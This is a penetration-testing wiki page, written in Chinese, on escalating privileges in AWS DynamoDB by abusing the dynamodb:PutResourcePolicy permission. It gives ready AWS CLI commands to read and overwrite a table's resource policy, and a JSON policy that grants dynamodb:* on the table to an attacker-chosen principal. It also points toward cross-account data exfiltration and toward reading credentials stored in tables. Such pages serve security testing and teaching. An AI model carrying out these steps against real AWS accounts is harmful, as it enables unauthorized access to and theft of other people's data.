# AWS - DynamoDB Privesc

{{#include ../../../banners/hacktricks-training.md}}

## dynamodb

有关dynamodb的更多信息，请查看：

{{#ref}}
../aws-services/aws-dynamodb-enum.md
{{#endref}}

### `dynamodb:PutResourcePolicy`，可选的 `dynamodb:GetResourcePolicy`

自2024年3月起，AWS为DynamoDB提供*基于资源的策略*（[AWS News](https://aws.amazon.com/about-aws/whats-new/2024/03/amazon-dynamodb-resource-based-policies/)）。

因此，如果您对一个表具有`dynamodb:PutResourcePolicy`，您可以轻松地授予自己或任何其他主体对该表的完全访问权限。

将`dynamodb:PutResourcePolicy`授予随机主体通常是意外发生的，如果管理员认为授予`dynamodb:Put*`只会允许主体将项目放入数据库中——或者如果他们在2024年3月之前授予了该权限集...

理想情况下，您还应该拥有`dynamodb:GetResourcePolicy`，这样您就不会覆盖其他潜在的重要权限，而只是注入您所需的附加权限：
```bash
# get the current resource based policy (if it exists) and save it to a file
aws dynamodb get-resource-policy \
--resource-arn <table_arn> \
--query 'Policy' \
--output text > policy.json
```
如果您无法检索当前策略，请使用此策略，该策略授予您的主体对表的完全访问权限：
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "FullAccessToDynamoDBTable",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::<ACCOUNT_ID>:<USER_OR_ROLE>/<USERNAME_OR_ROLENAME>"
},
"Action": [
"dynamodb:*"
],
"Resource": [
"arn:aws:dynamodb:<REGION>:<AWS_ACCOUNT_ID>:table/<TABLENAME>"
]
}
]
}
```
如果您需要自定义，这里是所有可能的DynamoDB操作的列表：[AWS Documentation](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API_Operations.html)。这里是可以通过基于资源的策略允许的所有操作的列表*以及这些操作中哪些可以跨账户使用（考虑数据外泄！）*：[AWS Documentation](https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/rbac-iam-actions.html)

现在，准备好策略文档`policy.json`，放置资源策略：
```bash
# put the new policy using the prepared policy file
# dynamodb does weirdly not allow a direct file upload
aws dynamodb put-resource-policy \
--resource-arn <table_arn> \
--policy "$(cat policy.json)"
```
现在，您应该拥有所需的权限。

### 后期利用

据我所知，**仅通过拥有一些 AWS `dynamodb` 权限，没有其他直接的方法可以提升权限**。您可以**从表中读取敏感**信息（可能包含 AWS 凭证）并**在表中写入信息**（这可能触发其他漏洞，例如 lambda 代码注入……），但所有这些选项在**DynamoDB 后期利用页面**中已经考虑过：

{{#ref}}
../aws-post-exploitation/aws-dynamodb-post-exploitation.md
{{#endref}}

### TODO: 通过数据流读取数据

{{#include ../../../banners/hacktricks-training.md}}
